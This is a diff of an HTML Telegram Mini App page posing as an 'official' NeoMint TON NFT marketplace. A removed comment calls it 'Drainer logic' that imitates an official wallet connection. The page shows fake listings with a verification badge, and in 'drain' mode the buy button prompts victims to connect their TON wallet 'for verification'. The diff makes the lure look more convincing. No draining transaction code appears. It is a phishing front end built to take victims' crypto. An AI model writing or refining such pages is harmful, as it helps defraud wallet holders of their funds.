@@ -1,66 +1,86 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NeoMint Marketplace</title>
+    <title>NeoMint | TON Portals</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --tg-theme-bg: #000000; --tg-theme-text: #ffffff; --accent: #0088cc; }
-        body { font-family: sans-serif; background: var(--tg-theme-bg); color: var(--tg-theme-text); margin: 0; padding: 15px; user-select: none; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .verified { color: var(--accent); font-size: 12px; font-weight: bold; border: 1px solid var(--accent); padding: 2px 6px; border-radius: 10px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .card { background: #1c1c1e; border-radius: 12px; border: 1px solid #2c2c2e; padding: 10px; position: relative; }
-        .nft-preview { width: 100%; aspect-ratio: 1; background: linear-gradient(45deg, #121212, #252525); border-radius: 8px; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
-        .title { font-size: 14px; font-weight: bold; margin-bottom: 4px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-        .price { font-size: 12px; color: #8e8e93; line-height: 1.4; }
-        .price b { color: var(--accent); }
-        .buy-btn { width: 100%; background: var(--accent); color: white; border: none; padding: 8px; border-radius: 8px; margin-top: 10px; font-weight: bold; cursor: pointer; }
-        .admin-badge { position: absolute; top: 5px; right: 5px; background: red; font-size: 8px; padding: 2px 4px; border-radius: 4px; display: none; }
+        :root { --bg: #0f1012; --card: #17181a; --text: #ffffff; --sub: #8e8e93; --accent: #0088cc; --border: #2c2c2e; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 16px; -webkit-font-smoothing: antialiased; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
+        .logo { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; }
+        .badge { background: rgba(0, 136, 204, 0.1); color: var(--accent); font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 100px; border: 1px solid var(--accent); }
+        .nft-grid { display: flex; flex-direction: column; gap: 20px; }
+        .card { background: var(--card); border-radius: 20px; border: 1px solid var(--border); overflow: hidden; }
+        .img-container { width: 100%; aspect-ratio: 1; overflow: hidden; background: #000; position: relative; }
+        .img-container img { width: 100%; height: 100%; object-fit: cover; }
+        .info { padding: 16px; }
+        .name { font-size: 18px; font-weight: 700; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .sold-tag { background: #eb4034; font-size: 10px; padding: 2px 6px; border-radius: 4px; }
+        .props { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 16px; }
+        .prop-item { background: #242529; padding: 8px 12px; border-radius: 10px; border: 1px solid #3a3b3f; }
+        .p-label { font-size: 10px; color: var(--sub); text-transform: uppercase; margin-bottom: 2px; }
+        .p-val { font-size: 13px; font-weight: 600; display: flex; justify-content: space-between; }
+        .rarity { color: var(--accent); font-size: 11px; }
+        .footer-card { border-top: 1px solid var(--border); padding: 16px; display: flex; justify-content: space-between; align-items: center; background: #1c1d21; }
+        .price-tag { font-size: 20px; font-weight: 800; color: var(--text); }
+        .price-tag span { color: var(--accent); font-size: 14px; margin-right: 4px; }
+        .buy-btn { background: var(--accent); color: white; border: none; padding: 12px 24px; border-radius: 12px; font-weight: 700; font-size: 15px; transition: 0.2s; }
+        .buy-btn:active { transform: scale(0.96); opacity: 0.8; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h2 style="margin:0;">NeoMint</h2>
-        <span class="verified">✓ VERIFIED</span>
+        <div class="logo">NeoMint</div>
+        <div class="badge">OFFICIAL PORTAL</div>
     </div>
-    <div class="grid" id="nft-grid"></div>
+
+    <div class="nft-grid" id="grid"></div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
         const urlParams = new URLSearchParams(window.location.search);
-        const mode = urlParams.get('mode'); // 'drain' или 'market'
+        const mode = urlParams.get('mode');
 
         const nfts = [
-            ...Array.from({length: 19}, (_, i) => ({ name: `Westside Sign #${1000+i}`, price: (45+i*3.5).toFixed(1), emoji: '🖼️' })),
-            ...Array.from({length: 5}, (_, i) => ({ name: `Loot Bag: ${['Gold','Elite','Rare','Mythic','God'][i]}`, price: (250+i*110).toFixed(1), emoji: '💰' }))
+            { id: 10744, name: "Westside Sign", model: "Sugar Daddy", r: "2.5%", price: 420, img: "https://i.ibb.co/qFmRLvM/image-337a08.png" },
+            { id: 5, name: "Loot Bag", model: "Orange Croc", r: "1.5%", price: 455, img: "https://i.ibb.co/L5fM4y0/image-337986.png" },
+            { id: 1597, name: "Loot Bag", model: "Biscuit", r: "1.5%", price: 399, img: "https://i.ibb.co/D8m3Tzj/image-337947.png" },
+            { id: 1863, name: "Westside Sign", model: "Bible Of Love", r: "1.5%", price: 299, img: "https://i.ibb.co/3Wq8zN4/image-337a3f.png" },
+            { id: 11051, name: "Loot Bag", model: "White Pony", r: "1.5%", price: 320, img: "https://i.ibb.co/Xz900jK/image-3379e1.png" },
+            { id: 9964, name: "Loot Bag", model: "Black Ascot", r: "2%", price: 280, img: "https://i.ibb.co/VvzK99T/image-337a00.png" }
         ];
 
-        const container = document.getElementById('nft-grid');
-        nfts.forEach(nft => {
-            const el = document.createElement('div');
-            el.className = 'card';
-            el.innerHTML = `
-                <div class="nft-preview">${nft.emoji}</div>
-                <div class="title">${nft.name}</div>
-                <div class="price"><b>${nft.price} TON</b><br>⭐ ${(nft.price*15).toFixed(0)} | $${(nft.price*7).toFixed(0)}</div>
-                <button class="buy-btn" onclick="action('${nft.name}')">Buy</button>
-            `;
-            container.appendChild(el);
+        const container = document.getElementById('grid');
+        nfts.forEach(n => {
+            container.innerHTML += `
+                <div class="card">
+                    <div class="img-container"><img src="${n.img}"></div>
+                    <div class="info">
+                        <div class="name">${n.name} #${n.id} <span class="sold-tag">RARE</span></div>
+                        <div class="props">
+                            <div class="prop-item"><div class="p-label">Model</div><div class="p-val">${n.model} <span class="rarity">${n.r}</span></div></div>
+                            <div class="prop-item"><div class="p-label">Status</div><div class="p-val">Minted</div></div>
+                        </div>
+                    </div>
+                    <div class="footer-card">
+                        <div class="price-tag"><span>💎</span>${n.price}</div>
+                        <button class="buy-btn" onclick="checkout('${n.name} #${n.id}')">Get NFT</button>
+                    </div>
+                </div>`;
         });
 
-        function action(name) {
+        function checkout(name) {
             if (mode === 'drain') {
-                // Имитация официального подключения кошелька (Drainer logic)
                 tg.showPopup({
-                    title: 'Confirm Connection',
-                    message: 'To complete the purchase, connect your TON wallet for verification.',
-                    buttons: [{type: 'default', text: 'Connect Tonkeeper'}]
+                    title: 'Ownership Verification',
+                    message: 'To claim ' + name + ', connect your TON wallet to verify eligibility.',
+                    buttons: [{type: 'default', text: 'Connect Wallet', id: 'conn'}]
                 });
             } else {
-                tg.showAlert('This item is currently locked for public sale.');
+                tg.showAlert('Registration for public drop is closed. Access denied.');
             }
         }
     </script>
